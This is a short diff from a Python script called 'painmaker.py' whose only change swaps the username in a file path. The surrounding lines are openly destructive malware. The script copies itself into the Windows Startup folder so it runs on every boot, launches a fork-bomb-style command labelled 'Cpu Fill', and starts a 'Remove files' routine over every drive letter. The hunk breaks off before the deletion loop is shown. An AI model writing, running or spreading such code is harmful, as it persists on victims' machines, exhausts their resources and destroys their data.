@@ -4,7 +4,7 @@ import subprocess #using commands
 from time import time #timing 
 import shutil #reproduce
 
-shutil.copy(__file__,'C:\\Users\\Tabesh\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\painmaker.py') #reproduce on startup Folder
+shutil.copy(__file__,'C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\painmaker.py') #reproduce on startup Folder
 os.system("%0|%0") #Cpu Fill
 #Remove files--------------------------------------
 list = ["e","w","c","f","d","y","u","i","o","p","l","k","j","h","g","r","t","s","a","z","x","q","v","b","n","m"] #drives list
